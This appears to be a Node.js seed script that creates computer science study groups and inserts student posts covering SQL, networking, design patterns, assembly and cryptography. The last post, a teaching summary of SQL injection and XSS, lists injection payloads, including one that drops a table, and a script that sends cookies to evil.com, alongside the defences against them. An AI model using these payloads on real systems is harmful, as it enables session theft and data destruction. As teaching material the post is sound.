require('dotenv').config();
const mongoose = require('mongoose');
const User    = require('./models/User');
const Group   = require('./models/Group');
const Post    = require('./models/Post');

const run = async () => {
  await mongoose.connect(process.env.MONGO_URI);
  console.log('Connected');

  // Use existing CS users
  const csUsers = await User.find({ department: 'Computer Science' }).select('_id name');
  if (csUsers.length < 4) { console.error('Not enough CS users'); return mongoose.disconnect(); }
  const [u1, u2, u3, u4] = csUsers;
  const now  = new Date();
  const ago  = d => new Date(now - d * 86400000);

  // ── Remove previously seeded groups from this script to allow re-runs ──
  await Group.deleteMany({ name: { $in: [
    'SQL & Database Design', 'Computer Networks', 'Software Engineering',
    'Computer Architecture', 'Cybersecurity Fundamentals'
  ]}});

  // ── New CS Groups ────────────────────────────────────────────────────────
  const groups = await Group.insertMany([
    {
      name: 'SQL & Database Design',
      description: 'Queries, schema design, normalisation, indexes — everything SQL from beginner to advanced.',
      subject: 'Database Systems',
      department: 'Computer Science',
      year: 2, semester: 'B',
      isPrivate: false,
      tags: ['sql', 'databases', 'queries'],
      admin: u1._id,
      members: [u1._id, u2._id, u3._id, u4._id],
    },
    {
      name: 'Computer Networks',
      description: 'OSI model, TCP/IP, routing, sockets and network programming.',
      subject: 'Computer Networks',
      department: 'Computer Science',
      year: 3, semester: 'A',
      isPrivate: false,
      tags: ['networks', 'tcp-ip', 'protocols'],
      admin: u2._id,
      members: [u1._id, u2._id, u3._id, u4._id],
    },
    {
      name: 'Software Engineering',
      description: 'Design patterns, UML, Agile, testing — everything you need for the SE course.',
      subject: 'Software Engineering',
      department: 'Computer Science',
      year: 3, semester: 'B',
      isPrivate: false,
      tags: ['se', 'design-patterns', 'agile'],
      admin: u3._id,
      members: [u1._id, u2._id, u3._id, u4._id],
    },
    {
      name: 'Computer Architecture',
      description: 'Assembly, CPU pipeline, cache, memory hierarchy — lecture notes and past exams.',
      subject: 'Computer Architecture',
      department: 'Computer Science',
      year: 2, semester: 'A',
      isPrivate: false,
      tags: ['architecture', 'assembly', 'cpu'],
      admin: u4._id,
      members: [u1._id, u2._id, u3._id, u4._id],
    },
    {
      name: 'Cybersecurity Fundamentals',
      description: 'Encryption, authentication, common attacks and defences — for the elective course.',
      subject: 'Cybersecurity',
      department: 'Computer Science',
      year: 4, semester: 'A',
      isPrivate: false,
      tags: ['security', 'cryptography', 'hacking'],
      admin: u1._id,
      members: [u1._id, u2._id, u3._id],
    },
  ]);
  const [sqlG, netG, seG, archG, secG] = groups;
  console.log(`Added ${groups.length} CS groups`);

  // ── Posts for SQL & Database Design ────────────────────────────────────
  await Post.insertMany([
    {
      author: u1._id, group: sqlG._id, type: 'material', tags: ['sql', 'joins'],
      createdAt: ago(5),
      content: `SQL Joins — Complete Visual Guide

INNER JOIN — only rows that match in BOTH tables:
  SELECT o.id, c.name
  FROM orders o
  INNER JOIN customers c ON o.customer_id = c.id;

LEFT JOIN — all rows from left table, NULLs where no match on right:
  SELECT c.name, o.id
  FROM customers c
  LEFT JOIN orders o ON c.id = o.customer_id;
  -- Customers with no orders will appear with o.id = NULL

RIGHT JOIN — mirror of LEFT JOIN (rarely used; just swap the tables)

FULL OUTER JOIN — all rows from both tables (MySQL doesn't support this natively — use UNION):
  SELECT * FROM a LEFT JOIN b ON a.id = b.id
  UNION
  SELECT * FROM a RIGHT JOIN b ON a.id = b.id;

CROSS JOIN — cartesian product (every row × every row): use carefully!

SELF JOIN — join a table with itself:
  SELECT e.name AS employee, m.name AS manager
  FROM employees e
  JOIN employees m ON e.manager_id = m.id;

Common exam trap: INNER JOIN vs WHERE with implicit join syntax:
  WHERE a.id = b.id  ← implicit inner join (old syntax, avoid)
  INNER JOIN ... ON  ← explicit, always prefer this`
    },
    {
      author: u2._id, group: sqlG._id, type: 'material', tags: ['sql', 'normalisation'],
      createdAt: ago(4),
      content: `Database Normalisation — 1NF through BCNF

WHY normalise? To eliminate data redundancy and prevent update/insert/delete anomalies.

1NF (First Normal Form):
  ✓ Every column must contain atomic (indivisible) values
  ✓ No repeating groups or arrays in a column
  ✗ Bad: phone_numbers = "052-1234, 054-5678" in one cell
  ✓ Good: separate row per phone number

2NF (Second Normal Form):
  ✓ Must be in 1NF
  ✓ No partial dependency: every non-key attribute must depend on the WHOLE primary key
  Applies only when the primary key is composite
  ✗ Bad: (order_id, product_id) → product_name — product_name depends only on product_id
  ✓ Fix: move product_name to a separate Products table

3NF (Third Normal Form):
  ✓ Must be in 2NF
  ✓ No transitive dependency: non-key attributes must not depend on OTHER non-key attributes
  ✗ Bad: employee_id → department_id → department_name
  ✓ Fix: separate Departments table

BCNF (Boyce-Codd Normal Form — stronger than 3NF):
  ✓ For every functional dependency X → Y, X must be a superkey
  Handles edge cases 3NF misses (rare in practice)

Rule of thumb for the exam:
  If removing a column to a new table REDUCES redundancy → you haven't normalised enough.
  If removing it LOSES information → you've over-normalised.`
    },
    {
      author: u3._id, group: sqlG._id, type: 'question', tags: ['sql', 'indexes'],
      createdAt: ago(2),
      content: `Can someone explain the difference between a clustered and a non-clustered index?

I know a clustered index changes the physical order of the table data, and there can only be one per table (usually the primary key). But I'm confused about non-clustered indexes — do they store a separate copy of the data? And when should I use one vs the other?

Also — does adding too many indexes actually slow down INSERT and UPDATE operations?`
    },
    {
      author: u1._id, group: sqlG._id, type: 'material', tags: ['sql', 'indexes', 'performance'],
      createdAt: ago(1),
      content: `Answer: Clustered vs Non-Clustered Indexes

CLUSTERED INDEX:
  • The table rows are physically stored in the order of this index
  • Only ONE per table (because data can only be sorted one way)
  • Lookups are fast: once the index is found, the data IS there
  • Usually the primary key (created automatically in most DBMS)

NON-CLUSTERED INDEX:
  • A separate structure that holds the indexed column(s) + a pointer back to the actual row
  • You can have MANY per table (SQL Server allows up to 999)
  • Lookup: index → pointer → fetch the actual row (extra hop = slightly slower)
  • Use for columns you frequently search/filter/join on that aren't the PK

Index trade-offs:
  READS get faster (WHERE, ORDER BY, JOIN on indexed columns)
  WRITES get slower (INSERT/UPDATE/DELETE must maintain all indexes)
  Rule of thumb: index columns used in WHERE clauses or JOINs; avoid over-indexing write-heavy tables

Covering index (advanced):
  An index that includes ALL columns needed by the query — no row lookup needed at all.
  CREATE INDEX idx_covering ON orders (customer_id) INCLUDE (order_date, total);

Exam tip: if a query does a full table scan despite an index existing, check if the WHERE clause uses a function on the column — indexes can't be used in that case:
  ✗ WHERE YEAR(created_at) = 2024  — full scan
  ✓ WHERE created_at >= '2024-01-01' AND created_at < '2025-01-01'  — uses index`
    },
    {
      author: u4._id, group: sqlG._id, type: 'announcement', tags: ['sql', 'exam'],
      createdAt: ago(1),
      content: `SQL exam is in 2 weeks (moed A). Based on past years:
- At least one question on JOINs (always an edge case with NULLs)
- Normalisation: given a table, identify which normal form it violates and fix it
- Aggregation: GROUP BY + HAVING (know the difference between WHERE and HAVING!)
- Subqueries vs JOINs — when to use each
- Indexing — conceptual questions, not syntax

GROUP BY reminder:
  SELECT dept, COUNT(*) FROM employees GROUP BY dept HAVING COUNT(*) > 5;
  WHERE filters BEFORE grouping — HAVING filters AFTER grouping`
    },
  ]);

  // ── Posts for Computer Networks ─────────────────────────────────────────
  await Post.insertMany([
    {
      author: u2._id, group: netG._id, type: 'material', tags: ['networks', 'osi'],
      createdAt: ago(6),
      content: `OSI Model — All 7 Layers with Real Examples

Mnemonic (top to bottom): "All People Seem To Need Data Processing"
Or (bottom to top): "Please Do Not Throw Sausage Pizza Away"

Layer 7 — Application: HTTP, HTTPS, FTP, SMTP, DNS, WebSocket
  What you interact with directly. DNS resolves hostnames to IPs here.

Layer 6 — Presentation: SSL/TLS encryption, JPEG compression, ASCII/Unicode encoding
  Translates data format between the application and the network.

Layer 5 — Session: manages sessions (open/close/sync) — e.g. NFS, RPC
  Less relevant in modern TCP/IP; TCP handles most of this.

Layer 4 — Transport: TCP (reliable, ordered) vs UDP (fast, no guarantee)
  Port numbers live here. TCP: 3-way handshake (SYN → SYN-ACK → ACK)
  TCP adds: sequencing, flow control (sliding window), error recovery

Layer 3 — Network: IP (v4/v6), ICMP (ping), routing (OSPF, BGP)
  Handles logical addressing and routing between networks.
  Routers operate at this layer.

Layer 2 — Data Link: Ethernet, Wi-Fi (802.11), MAC addresses, ARP
  Switches operate here. Responsible for node-to-node delivery on the same network.
  Frames — unit of data at this layer.

Layer 1 — Physical: cables, radio waves, fiber, bits (0/1)
  NIC, hubs, repeaters.

Key exam distinction:
  Switch = Layer 2 (MAC) | Router = Layer 3 (IP) | Firewall = Layer 3/4`
    },
    {
      author: u3._id, group: netG._id, type: 'material', tags: ['networks', 'tcp-ip', 'sockets'],
      createdAt: ago(3),
      content: `TCP vs UDP — When to Use Each

TCP (Transmission Control Protocol):
  ✓ Reliable — guarantees delivery, retransmits lost packets
  ✓ Ordered — packets arrive in the order sent (sequence numbers)
  ✓ Flow control — sliding window prevents overwhelming receiver
  ✓ Congestion control — reduces rate when network is congested
  ✗ Slower — 3-way handshake + ACKs for every segment
  Use: web (HTTP/HTTPS), email (SMTP), file transfer (FTP), SSH

UDP (User Datagram Protocol):
  ✓ Fast — no handshake, no ACK waiting
  ✓ Low latency — no retransmission delay
  ✓ Supports broadcast and multicast
  ✗ No reliability — packets can be lost, duplicated, reordered
  ✗ No ordering
  Use: video streaming (Netflix uses QUIC/UDP), VoIP (Zoom), DNS lookups, online games

QUIC (HTTP/3):
  Built on UDP but adds reliability at the application layer — best of both worlds.
  Used by Google, Cloudflare, YouTube.

TCP 3-Way Handshake:
  Client → SYN (seq=x)
  Server → SYN-ACK (seq=y, ack=x+1)
  Client → ACK (ack=y+1)
  Connection established!

TCP 4-Way Teardown:
  Client → FIN | Server → ACK | Server → FIN | Client → ACK`
    },
    {
      author: u4._id, group: netG._id, type: 'question', tags: ['networks', 'routing'],
      createdAt: ago(1),
      content: `I'm confused about the difference between static routing and dynamic routing protocols. When would you use OSPF vs BGP? And what is "autonomous system" exactly?`
    },
    {
      author: u1._id, group: netG._id, type: 'material', tags: ['networks', 'routing', 'bgp', 'ospf'],
      createdAt: ago(1),
      content: `Routing Protocols — OSPF vs BGP

OSPF (Open Shortest Path First):
  Type: Interior Gateway Protocol (IGP) — used WITHIN one organisation
  Algorithm: Dijkstra's shortest path
  Metric: "cost" (usually based on link bandwidth)
  Convergence: fast (seconds)
  Use: routing inside a university, company, data center

BGP (Border Gateway Protocol):
  Type: Exterior Gateway Protocol (EGP) — used BETWEEN organisations
  Algorithm: path-vector (not shortest path — uses policy)
  Metric: AS path length + complex policy rules
  Convergence: slow (minutes) — stability over speed
  Use: how the internet itself routes traffic between ISPs

Autonomous System (AS):
  A collection of IP prefixes under a single administrative entity with a unified routing policy.
  Example: Google = AS15169, Cloudflare = AS13335
  Each AS has a unique ASN (Autonomous System Number).
  BGP exchanges routing info BETWEEN autonomous systems.

Analogy:
  OSPF = navigation inside a city (fast, knows local roads)
  BGP = negotiating which highways to use between cities (policy-driven, not just distance)`
    },
  ]);

  // ── Posts for Software Engineering ──────────────────────────────────────
  await Post.insertMany([
    {
      author: u3._id, group: seG._id, type: 'material', tags: ['se', 'design-patterns', 'solid'],
      createdAt: ago(7),
      content: `Design Patterns — The 5 Most Important for the Exam

SOLID Principles (quick reminder):
  S — Single Responsibility: one class, one reason to change
  O — Open/Closed: open for extension, closed for modification
  L — Liskov Substitution: subclasses must be substitutable for their parent
  I — Interface Segregation: don't force classes to implement methods they don't need
  D — Dependency Inversion: depend on abstractions, not concretions

1. SINGLETON (Creational):
  Ensures only ONE instance of a class exists.
  Use: database connection pool, logging, configuration
  Implementation: private constructor + static getInstance() method
  ⚠️ Pitfall: hard to test (tight coupling, global state)

2. FACTORY METHOD (Creational):
  Define an interface for creating objects, let subclasses decide which class to instantiate.
  Use: when the exact type of object to create isn't known at compile time

3. OBSERVER (Behavioural):
  One-to-many dependency: when one object changes state, all dependents are notified.
  Use: event systems, React's state management, UI updates
  Components: Subject (publisher) + Observer (subscriber)

4. STRATEGY (Behavioural):
  Define a family of algorithms, encapsulate each one, make them interchangeable.
  Use: sorting algorithms, payment methods, route calculations
  Replaces ugly if/else chains with polymorphism

5. DECORATOR (Structural):
  Attach additional responsibilities to an object dynamically.
  Use: Java I/O streams, middleware in Express, adding features without subclassing

UML tip: know the difference between aggregation (hollow diamond) and composition (filled diamond).`
    },
    {
      author: u4._id, group: seG._id, type: 'material', tags: ['se', 'agile', 'scrum'],
      createdAt: ago(4),
      content: `Agile & Scrum — Summary for SE Exam

AGILE MANIFESTO (4 values):
  Individuals & interactions > processes & tools
  Working software > comprehensive documentation
  Customer collaboration > contract negotiation
  Responding to change > following a plan

SCRUM ROLES:
  Product Owner: represents stakeholders, owns the product backlog, prioritises work
  Scrum Master: coach, removes impediments, ensures Scrum is followed (NOT a manager)
  Development Team: self-organising, cross-functional, 3–9 people

SCRUM EVENTS:
  Sprint: time-boxed iteration (1–4 weeks, usually 2)
  Sprint Planning: team selects items from backlog, creates sprint goal
  Daily Scrum (standup): 15 min — what did I do yesterday / today / blockers?
  Sprint Review: demonstrate working software to stakeholders
  Sprint Retrospective: process improvement — what went well / badly / to change?

BACKLOG:
  Product Backlog: all known work, ordered by priority (Product Owner owns this)
  Sprint Backlog: items selected for current sprint + plan for delivering them
  User Story format: "As a [role], I want [feature] so that [benefit]"
  Acceptance criteria define when a story is "done"

SCRUM vs KANBAN:
  Scrum: sprints, ceremonies, defined roles
  Kanban: continuous flow, WIP limits, no sprints (good for support/ops teams)

Velocity: average story points completed per sprint — used for release planning`
    },
    {
      author: u2._id, group: seG._id, type: 'question', tags: ['se', 'testing'],
      createdAt: ago(2),
      content: `What's the difference between unit tests, integration tests, and end-to-end tests? And what's a mock vs a stub? I keep getting confused by these terms in the lecture.`
    },
    {
      author: u1._id, group: seG._id, type: 'material', tags: ['se', 'testing', 'tdd'],
      createdAt: ago(1),
      content: `Testing Types and TDD — Full Summary

TEST PYRAMID (from bottom to top):
  Unit Tests (70%): test a single function/class in isolation; fast, cheap to run
  Integration Tests (20%): test interaction between modules (e.g. controller + DB); slower
  E2E Tests (10%): simulate real user behaviour in a browser; slowest, most expensive

UNIT vs INTEGRATION vs E2E:
  Unit:        myFunction(2, 3) === 5   ← no DB, no network, instant
  Integration: POST /api/login → check JWT returned + user saved to DB
  E2E:         Playwright opens browser → fills form → submits → sees dashboard

MOCK vs STUB vs SPY:
  Stub: a fake implementation that returns pre-defined values ("when called, return X")
    Example: stub database.findUser() to return { id:1, name:"Alice" }
  Mock: a stub that ALSO records calls so you can assert HOW it was used
    Example: assert that sendEmail() was called exactly once with the right args
  Spy: wraps the REAL implementation and records calls (doesn't replace behavior)
    Example: spy on console.log to see what was logged

TDD (Test-Driven Development) — RED → GREEN → REFACTOR:
  1. RED: write a failing test first (the feature doesn't exist yet)
  2. GREEN: write the minimum code to make the test pass
  3. REFACTOR: clean up the code without breaking the test

Benefits of TDD:
  • Forces you to think about the interface before the implementation
  • Test suite is complete by definition (code was written to pass tests)
  • Makes refactoring safe (tests catch regressions immediately)`
    },
  ]);

  // ── Posts for Computer Architecture ─────────────────────────────────────
  await Post.insertMany([
    {
      author: u4._id, group: archG._id, type: 'material', tags: ['architecture', 'assembly', 'cpu'],
      createdAt: ago(8),
      content: `x86 Assembly — Quick Reference

REGISTERS (x86-64):
  RAX, RBX, RCX, RDX — general purpose (64-bit)
  EAX, EBX, ECX, EDX — lower 32 bits of the above
  RSP — stack pointer (top of the stack)
  RBP — base pointer (bottom of current stack frame)
  RIP — instruction pointer (points to next instruction)
  RFLAGS — status flags (ZF=zero, SF=sign, CF=carry, OF=overflow)

COMMON INSTRUCTIONS:
  MOV dst, src    — copy src into dst
  ADD dst, src    — dst = dst + src
  SUB dst, src    — dst = dst - src
  MUL src         — RAX = RAX * src (unsigned)
  CMP a, b        — sets flags based on a - b (doesn't store result)
  JE  label       — jump if ZF=1 (equal)
  JNE label       — jump if ZF=0 (not equal)
  JG  label       — jump if greater (signed)
  JA  label       — jump if above (unsigned)
  PUSH src        — RSP -= 8; [RSP] = src
  POP  dst        — dst = [RSP]; RSP += 8
  CALL label      — PUSH RIP; JMP label
  RET             — POP RIP

FUNCTION CALLING CONVENTION (System V AMD64):
  Arguments: RDI, RSI, RDX, RCX, R8, R9 (then stack)
  Return value: RAX
  Callee must preserve: RBX, RBP, R12–R15

Example — compute 5! in assembly:
  MOV RCX, 5    ; counter
  MOV RAX, 1    ; accumulator
loop:
  MUL RCX       ; RAX = RAX * RCX
  DEC RCX       ; RCX--
  JNZ loop      ; if RCX != 0, repeat`
    },
    {
      author: u1._id, group: archG._id, type: 'material', tags: ['architecture', 'cache', 'memory'],
      createdAt: ago(5),
      content: `Memory Hierarchy and Cache — Exam Summary

Memory hierarchy (fast → slow, expensive → cheap):
  Registers → L1 Cache → L2 Cache → L3 Cache → RAM → SSD → HDD

CACHE:
  Why? RAM is ~100x slower than CPU. Cache stores frequently used data close to CPU.
  L1: per-core, ~32KB, ~1ns access, fastest
  L2: per-core, ~256KB, ~5ns
  L3: shared across cores, ~8MB, ~20ns
  RAM: ~8GB+, ~100ns

Cache hit: data found in cache → fast!
Cache miss: data NOT in cache → must fetch from RAM → slow (cache miss penalty)

CACHE MAPPING:
  Direct-mapped: each memory block maps to exactly one cache line
    + Simple, fast to check
    − High conflict misses (two popular addresses fight for same line)
  Fully associative: block can go anywhere in cache
    + No conflicts
    − Expensive to check (must search all lines)
  N-way set associative: cache divided into sets, each block maps to one set, can go in any of N lines
    Compromise: modern CPUs use 8-way or 16-way

REPLACEMENT POLICIES:
  LRU (Least Recently Used) — evict the line unused for the longest time (most common)
  FIFO — evict the oldest line
  Random — simple, surprisingly effective

WRITE POLICIES:
  Write-through: write to cache AND RAM simultaneously → always consistent, slower
  Write-back: write to cache only; write to RAM only when the line is evicted → faster, risk of data loss

LOCALITY:
  Temporal locality: recently used data will likely be used again soon (loops, variables)
  Spatial locality: data near recently used data will likely be used soon (arrays)
  → always allocate arrays contiguously; access row-by-row in 2D arrays (row-major order)`
    },
  ]);

  // ── Posts for Cybersecurity ──────────────────────────────────────────────
  await Post.insertMany([
    {
      author: u1._id, group: secG._id, type: 'material', tags: ['security', 'cryptography'],
      createdAt: ago(6),
      content: `Cryptography Basics — Symmetric vs Asymmetric

SYMMETRIC ENCRYPTION (same key for encrypt + decrypt):
  Examples: AES (AES-128, AES-256), DES (broken), 3DES
  ✓ Fast — suitable for encrypting large data
  ✗ Key distribution problem: how do you securely share the key?
  Use: encrypting files, disk encryption (BitLocker, FileVault), TLS after handshake

AES:
  Block cipher — encrypts fixed 128-bit blocks
  Key sizes: 128, 192, or 256 bits
  Modes: ECB (insecure — identical blocks → identical ciphertext), CBC, GCM (authenticated)
  Always use AES-GCM or AES-CBC with proper IV (Initialisation Vector)

ASYMMETRIC ENCRYPTION (public key + private key pair):
  Examples: RSA, ECC (Elliptic Curve)
  ✓ Solves key distribution: share public key freely
  ✗ Slow — 1000x slower than symmetric
  Use: key exchange (TLS handshake), digital signatures, certificates

RSA:
  Security based on integer factorisation problem
  Key sizes: 2048-bit minimum (4096-bit for high security)
  Encrypt with recipient's PUBLIC key → only their PRIVATE key can decrypt
  Sign with your PRIVATE key → anyone with your PUBLIC key can verify

HYBRID APPROACH (used in TLS/HTTPS):
  1. Use asymmetric (RSA/ECC) to securely exchange a session key
  2. Use symmetric (AES) for the actual data — fast!

HASH FUNCTIONS (not encryption — one-way):
  MD5, SHA-1: broken — don't use for security
  SHA-256, SHA-3: secure
  bcrypt, Argon2: designed for password hashing (slow by design → resistant to brute force)
  Properties: deterministic, fast to compute, collision-resistant, pre-image resistant`
    },
    {
      author: u2._id, group: secG._id, type: 'question', tags: ['security', 'sql-injection'],
      createdAt: ago(2),
      content: `How does SQL injection actually work, and what's the difference between prepared statements and parameterised queries? We're covering this in the security elective next week and I want to understand it properly before the lecture.`
    },
    {
      author: u3._id, group: secG._id, type: 'material', tags: ['security', 'sql-injection', 'xss'],
      createdAt: ago(1),
      content: `SQL Injection & XSS — How They Work + Defences

SQL INJECTION:
  Attacker inserts SQL code into user input that is concatenated into a query.

  Vulnerable code:
    const query = "SELECT * FROM users WHERE username='" + username + "'";
    // If username = "' OR '1'='1" → query becomes:
    // SELECT * FROM users WHERE username='' OR '1'='1'  ← returns ALL users!

  Classic payloads:
    ' OR '1'='1  — bypass login
    '; DROP TABLE users; --  — destructive
    ' UNION SELECT username, password FROM users --  — data exfiltration

  Defence — Prepared Statements / Parameterised Queries:
    const query = "SELECT * FROM users WHERE username = ?";
    db.execute(query, [username]);
    // The DB treats the parameter as DATA, never as SQL code → injection impossible

  Also: ORMs (Sequelize, Mongoose) parameterise automatically. Never concatenate user input into SQL.

XSS (Cross-Site Scripting):
  Attacker injects malicious JavaScript into a page viewed by other users.

  Reflected XSS:
    URL: /search?q=<script>document.location='https://evil.com?c='+document.cookie</script>
    If the server echoes the query back without sanitising → victim's cookie is stolen

  Stored XSS:
    Attacker posts a comment containing <script>...</script>
    Every user who views the post runs the malicious code

  DOM XSS:
    Client-side JS reads from URL/localStorage and writes to innerHTML → dangerous

  Defence:
    ✓ Escape/encode output: & → &amp;  < → &lt;  > → &gt;
    ✓ React escapes by default — DON'T use dangerouslySetInnerHTML with user input
    ✓ Content-Security-Policy header: prevents inline scripts
    ✓ HttpOnly cookies: JS can't read them → XSS can't steal session`
    },
  ]);

  const total = await Group.countDocuments({ department: 'Computer Science' });
  console.log(`Done. CS now has ${total} groups total.`);
  mongoose.disconnect();
};

run().catch(e => { console.error(e); process.exit(1); });
